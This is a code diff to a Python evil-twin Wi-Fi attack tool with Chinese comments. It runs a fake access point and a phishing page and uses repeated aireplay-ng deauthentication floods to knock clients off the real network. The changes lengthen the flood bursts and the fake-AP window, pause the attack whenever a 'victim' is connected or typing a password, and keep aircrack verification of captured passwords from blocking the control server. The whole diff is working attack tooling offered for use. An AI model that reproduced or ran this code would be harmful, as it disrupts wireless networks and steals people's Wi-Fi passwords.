@@ -25,7 +25,7 @@ import socket
 import threading
 import subprocess
 import urllib.parse
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 
 # ---------------- 配置（环境变量可覆盖，见 config.env.example） ----------------
 IFACE        = os.environ.get("WIFI_IFACE", "wlxYOUR_USB_WIFI_IFACE")
@@ -157,26 +157,32 @@ def deauth_loop(target, iface):
     """攻击期间持续踢人：周期广播 deauth 让真 AP 客户端掉线，
     直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。
 
-    关键逻辑：以"最近是否有密码提交"判断是否有人在交互——
-      - 60 秒内有密码提交 → 跳过本轮（不打断正在输密码的受害者）
-      - 有客户端关联假 AP（iw station dump 非空）→ 暂停压制
-      - 无交互 → 执行压制轮：闪断假 AP + 连续轰炸真 AP 5 秒，
-        再恢复假 AP（长在线窗口 40 秒），让受害者有充足时间连接
+    关键逻辑（v3.3，优化"连上不跳转/浏览器被拒"）：
+      - 有客户端关联着假 AP（iw station dump 非空）→ 永久暂停压制，
+        受害者连上后假 AP 全程在线，绝不闪断（这是跳转/加载失败的主因）
+      - 最近 60 秒内有密码提交 → 暂停压制（有人在交互）
+      - 无任何交互 → 压制轮：闪断假 AP + 轰炸真 AP 8 秒，再恢复假 AP
+        （在线窗口 85 秒，大幅降低"刚好撞上压制期"的概率）
+      - 在线窗口内每 5 秒检查一次关联/交互，一有客户端立即进入暂停模式
     """
     bssid, channel = target["bssid"], target["channel"]
-    log("持续踢人循环启动（低频强压制 ~50 秒一轮；有受害者交互则自动暂停）")
+    log("持续踢人循环启动（低频强压制 ~93 秒一轮；有受害者关联则全程暂停压制）")
     while not deauth_stop.is_set():
-        # 有人正在交互（最近 60 秒提交过密码）→ 跳过本轮，避免打断
+        # 1) 有客户端关联着假 AP → 一直暂停压制（绝不闪断正在输密码的人）
+        stas = assoc_stations(iface)
+        if stas:
+            log("客户端已关联假 AP (%s)，暂停压制，假 AP 持续在线..." % ",".join(sorted(stas)))
+            # 每 10 秒复查：客户端断开且 60 秒内无交互才恢复压制
+            while not deauth_stop.is_set():
+                if not assoc_stations(iface) and time.time() - last_post_ts() >= 60:
+                    break
+                deauth_stop.wait(10)
+            continue
+        # 2) 有人正在交互（最近 60 秒提交过密码）→ 跳过本轮，避免打断
         if time.time() - last_post_ts() < 60:
             deauth_stop.wait(10)
             continue
-        # 有客户端正关联着假 AP → 暂停压制，给时间输密码
-        stas = assoc_stations(iface)
-        if stas:
-            log("检测到客户端关联假 AP (%s)，暂停压制 30 秒" % ",".join(sorted(stas)))
-            deauth_stop.wait(30)
-            continue
-        # 1. 停假 AP → 切 monitor（压制阶段，真 AP 无稳定窗口）
+        # 3) 压制轮：停假 AP → 切 monitor（压制阶段，真 AP 无稳定窗口）
         run(f"systemctl stop {UNITS['hostapd']} 2>/dev/null; systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
         run("pkill -9 -f hostapd-mana 2>/dev/null")
         time.sleep(1)
@@ -184,9 +190,9 @@ def deauth_loop(target, iface):
         time.sleep(1)
         run(f"iw dev {iface} set channel {channel} 2>/dev/null")
         time.sleep(1)
-        # 2. 连续轰炸 5 秒（-0 0 无限循环 + timeout 5，真 AP 全程被打）
-        run(f"timeout 5 aireplay-ng -0 0 -a {bssid} {iface}", timeout=12)
-        # 3. 恢复假 AP（managed + 起 hostapd；使用网卡自身 MAC，不克隆 BSSID）
+        # 4. 连续轰炸 8 秒（-0 0 无限循环 + timeout 8，真 AP 全程被打）
+        run(f"timeout 8 aireplay-ng -0 0 -a {bssid} {iface}", timeout=15)
+        # 5. 恢复假 AP（managed + 起 hostapd；使用网卡自身 MAC，不克隆 BSSID）
         run(f"ip link set {iface} down; iw dev {iface} set type managed")
         run(f"ip addr flush dev {iface} 2>/dev/null")
         run(f"ip addr add {GATEWAY_IP}/24 dev {iface}")
@@ -201,8 +207,14 @@ def deauth_loop(target, iface):
             out, _, _ = run(f"systemctl is-active {UNITS['hostapd']}")
             if "active" in out:
                 break
-        # 4. 假 AP 长在线窗口（40 秒），受害者有充足时间发现并连接
-        deauth_stop.wait(40)
+        # 6. 假 AP 长在线窗口（85 秒），分段等待：一有客户端/交互立即暂停压制
+        waited = 0
+        while waited < 85 and not deauth_stop.is_set():
+            if assoc_stations(iface) or time.time() - last_post_ts() < 60:
+                log("检测到客户端关联/交互，提前结束在线窗口，进入暂停模式")
+                break
+            deauth_stop.wait(5)
+            waited += 5
 
 def assoc_stations(iface):
     """当前关联到假 AP 的客户端 MAC（iw station dump 实时关联表）。
@@ -814,7 +826,9 @@ if __name__ == "__main__":
     log("网卡: %s  钓鱼页: %s" % (IFACE, PORTAL_PY))
     if os.geteuid() != 0:
         log("警告: 未以 root 运行，部分命令可能失败，请使用 sudo")
-    srv = HTTPServer(("0.0.0.0", CTRL_PORT), Handler)
+    # ThreadingHTTPServer：多线程处理请求，/api/verify 跑 aircrack 验证时
+    # 不会阻塞 /api/status 轮询（单线程时前端 2 秒轮询会被卡死，按钮无响应）
+    srv = ThreadingHTTPServer(("0.0.0.0", CTRL_PORT), Handler)
     try:
         srv.serve_forever()
     except KeyboardInterrupt:
